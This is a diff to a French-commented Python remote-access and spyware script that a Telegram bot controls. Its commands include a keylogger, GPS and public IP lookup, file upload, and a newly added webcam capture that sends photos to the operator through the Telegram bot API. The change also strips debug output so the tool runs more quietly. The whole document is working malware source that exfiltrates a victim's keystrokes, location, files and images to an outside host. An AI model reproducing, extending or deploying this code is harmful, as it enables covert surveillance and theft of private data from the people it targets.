@@ -1,7 +1,7 @@
-import requests, datetime, time, geocoder, threading, json, sys, subprocess, os, mss, keyboard, pathlib, shutil
+import requests, datetime, time, geocoder, threading, json, sys, subprocess, os, mss, keyboard, pathlib, shutil, cv2
  
 """
-pip install requests geocoder mss keyboard pathlib
+pip install requests geocoder mss keyboard pathlib opencv-python
 """
  
 commandes = """
@@ -18,8 +18,20 @@ Envoyer photo ou document
 /keylogger_status
 /purgeall
 /getPublicIP
+/webcam_capture
 """
- 
+
+def takeWebcamPhoto():
+	
+	sendMessage("En cours...")
+	cam = cv2.VideoCapture(0) 
+	result, image = cam.read() 
+	if result:
+		cv2.imwrite(f"{maindir}\\webcam_capture.png", image)
+		sendDocument(f"{maindir}\\webcam_capture.png")
+	else:
+		sendMessage("Aucune webcam detectee")
+
 def on_key_press(event):
 	
 	if keylogging:
@@ -45,19 +57,19 @@ def startKeylogger():
 def sendDocument(path=""):
 	
 	url = f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={chat_id}"
-	print(requests.post(url, files={"document":open(path, "rb")}).text)
+	requests.post(url, files={"document":open(path, "rb")})
 	
  
 def sendPhoto(path=""):
 	
 	url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={chat_id}"
-	print(requests.post(url, files={"photo":open(path, "rb")}).text)
+	requests.post(url, files={"photo":open(path, "rb")})
 	
  
 def sendMessage(message=""):
 	
 	url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
-	print(requests.get(url).text)
+	requests.get(url)
 	
  
 def get_current_gps_coordinates():
@@ -95,6 +107,8 @@ last_time_recieved = round(datetime.datetime.now().timestamp())
 while True:
 	
 	try:
+		
+		print("[+] Listening....")
 		
 		if first:
 		
@@ -218,6 +232,9 @@ while True:
 				
 				elif "/getPublicIP" in last_message['message']['text']:
 					sendMessage(requests.get('https://checkip.amazonaws.com').text.strip())
+				
+				elif "/webcam_capture" in last_message['message']['text']:
+					takeWebcamPhoto()
 					
 				
 				out = subprocess.getoutput("cd")
